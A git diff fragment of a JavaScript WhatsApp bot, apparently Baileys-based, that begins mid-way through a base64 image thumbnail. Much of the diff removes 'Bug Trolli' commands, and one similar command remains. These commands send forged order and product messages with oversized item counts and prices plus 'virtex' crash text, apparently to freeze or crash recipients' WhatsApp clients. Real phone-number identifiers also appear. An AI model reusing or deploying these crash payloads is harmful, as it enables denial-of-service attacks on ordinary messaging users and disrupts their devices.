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",
-"itemCount": 1000000000000,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"orderTitle": "GUA GK NGERTI",
-"message":"entah lah gua nob",
-"sellerJid": "6288224859350@s.whatsapp.net",
-"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
-"totalAmount1000": "Rp 25.000.00",
-"totalCurrencyCode": "IDR",
-"contextInfo": {
-"forwardingScore": 3,
-"isForwarded": true
-}
-}
-}, {quoted:bugtrol, contextInfo:{}}) 
-
-Ramdani.toggleDisappearingMessages(from, 'Awoakwoakwoak')
-Ramdani.relayWAMessage(res)
-break
-case 'plp':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-res = await Ramdani.prepareMessageFromContent(from,{
-"listMessage": {
-"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
-"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
-"buttonText": danz,
-"listType": "SINGLE_SELECT",
-"sections": [
-{
-"title": danz,
-"rows": [
-{
-"title": "Banned",
-"rowId": "Banned"
-}
-]
-}
-]
-}
-}, {quoted:mek})
-Ramdani.relayWAMessage(res)
-break   
-case 'pcp':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!mek.key.fromMe && !isOwner) return
-buf = Mfake
-imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
-imeg = imeu.message.imageMessage
-res = await Ramdani.prepareMessageFromContent(from,{
-"productMessage": {
-"product": {
-"productImage": imeg,
-"productId": "150453297177375",
-"title": `${namabot} ~ 404 ${danz}`,
-"description": `${virtex}`,
-"currencyCode": "IDR",
-"priceAmount1000": "99999999999999999999999999999999",
-"productImageCount": 1
-},
-"businessOwnerJid": "6289512545999@s.whatsapp.net",
-"contextInfo": {
-"forwardingScore": 3,
-"isForwarded": true
-}
-}
-}, {quoted:bugtrol, contextInfo:{}}) 
-
-Ramdani.relayWAMessage(res)
-break
-// Bug Trolli 
-case 'psp':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned) // BUG TROLLI + BUG GC + TROLLI
-if (!mek.key.fromMe && !isOwner) return
-buf = Mfake
-imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
-imeg = imeu.message.imageMessage
-res = await Ramdani.prepareMessageFromContent(from,{
-"orderMessage": {
-"orderId": "150453297177375",
-"thumbnail": "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",
-"itemCount": 1000000000000,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"orderTitle": "GUA GK NGERTI",
-"message":"entah lah gua nob",
-"sellerJid": "6289512545999p.net",
-"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
-"totalAmount1000": "99999999999999999999",
-"totalCurrencyCode": "IDR",
-"contextInfo": {
-"forwardingScore": 3,
-"isForwarded": true
-}
-}
-}, {quoted:bugtrol, contextInfo:{}}) 
-
-Ramdani.toggleDisappearingMessages(from, 'Awoakwoakwoak')
-Ramdani.relayWAMessage(res)
-break  
 case 'p': // TROLLI
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
@@ -4960,7 +2395,7 @@ res = await Ramdani.prepareMessageFromContent(from,{
 "status": "INQUIRY",
 "surface": "CATALOG",
 "orderTitle": "LOL",
-"message":"Hallo Kak",
+"message":"Di Pilih Barang Nya",
 "sellerJid": "6289512545999p.net",
 "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
 "totalAmount1000": "99999999999999999999",
@@ -4974,8 +2409,6 @@ res = await Ramdani.prepareMessageFromContent(from,{
 
 Ramdani.relayWAMessage(res)
 break     
-//------------------<HEWAN MENU>---------------
-                    
 //------------------< Ingfo Bot >-------------------
       case 'runtime':
 if (!isRegist) return freply(mess.regist)
@@ -4987,15 +2420,10 @@ if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
